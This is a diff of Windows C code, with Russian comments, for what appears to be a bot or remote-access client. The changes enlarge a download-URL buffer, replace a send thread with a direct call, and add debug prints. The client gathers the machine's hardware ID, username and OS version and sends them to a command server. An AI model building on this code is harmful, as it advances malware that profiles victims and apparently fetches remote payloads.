@@ -1,5 +1,5 @@
 ﻿#include "winsock2.h"
-//#include "windows.h"
+#include "windowsx.h"
 #include "intrin.h"
 #include "ntdll.h"
 #include "iphlpapi.h"
@@ -31,7 +31,7 @@ struct CLIENTS
 
 struct DLE
 {
-	char URL[100];
+	char URL[1000];
 };
 
 //полностью копируем структуры из сервера
@@ -40,13 +40,6 @@ struct CMDiDATA
 	DWORD CMD; //тут у нас будут номера комманд
 	char DATA[1000]; //а тут данные которые мы хотим принять или отправить серверу
 };
-
-DWORD WINAPI SendThread(LPVOID param)
-{
-	send(Socket, (char*)&param, sizeof(CMDiDATA), 0);
-	return 0;
-}
-
 
 LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
@@ -107,17 +100,22 @@ LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM 
 					memcpy(client.HWID, HWID, sizeof(client.HWID));
 					memcpy(client.USERNAME, USERNAME, sizeof(client.USERNAME));
 					memcpy(client.OSVER, OSVER, sizeof(client.OSVER));
+
+					printf("\n\nclient.HWID: %s\n\tlen: %d\n\nclient.USERNAME: %s\n\tlen: %d\n\nclient.OSVER: %s\n\tlen: %d\n\n", client.HWID, lstrlenA(client.HWID), client.USERNAME, lstrlenA(client.USERNAME), client.OSVER, lstrlenA(client.OSVER));
+
 					indata.CMD = 0;
 					memcpy(indata.DATA, &client, sizeof(CLIENTS));
 
 					if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
 					{
-						CreateThread(NULL, 0, SendThread, (LPVOID)&indata, 0, 0);
+						printf("connected. send data to server...\n");
+						send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
 					}
 
 					free(USERNAME);
 					free(OSVER);
 					free(HWID);
+
 				}
 				break;
 			}
